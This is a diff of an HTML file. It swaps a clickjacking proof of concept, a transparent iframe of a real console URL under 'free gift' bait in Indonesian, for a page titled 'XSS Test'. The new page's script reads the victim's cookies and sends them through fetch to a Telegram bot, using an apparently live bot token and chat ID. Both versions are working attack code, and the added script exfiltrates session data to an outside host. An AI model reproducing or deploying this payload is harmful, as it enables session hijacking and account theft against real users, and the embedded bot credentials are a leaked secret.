@@ -1,34 +1,25 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Clickjacking PoC</title>
-    <style>
-        iframe {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            opacity: 0.1; /* Membuat iframe hampir transparan */
-            z-index: 2;
-        }
-        .bait {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            z-index: 1;
-            font-size: 20px;
-            background: red;
-            color: white;
-            padding: 10px;
-            border-radius: 5px;
-        }
-    </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Test</title>
 </head>
 <body>
-    <h1>Clickjacking PoC</h1>
-    <div class="bait">Klik tombol ini untuk hadiah gratis!</div>
-    <iframe src="https://console.neon.tech/9737752"></iframe>
+    <h1>Testing XSS</h1>
+    <script>
+        // Ambil cookie korban
+        var cookieData = document.cookie;
+
+        // Kirim ke bot Telegram
+        var botToken = "7748564047:AAHjrbeUGRSQmrJkDFv1HMFMbbWtDFKD9ak"; // Ganti dengan Token Bot
+        var chatId = "7353813329"; // Ganti dengan Chat ID
+        
+        var url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent("Cookie: " + cookieData);
+        
+        fetch(url)
+            .then(response => console.log("Cookie Sent to Telegram!"))
+            .catch(error => console.error("Error sending cookie:", error));
+    </script>
 </body>
 </html>
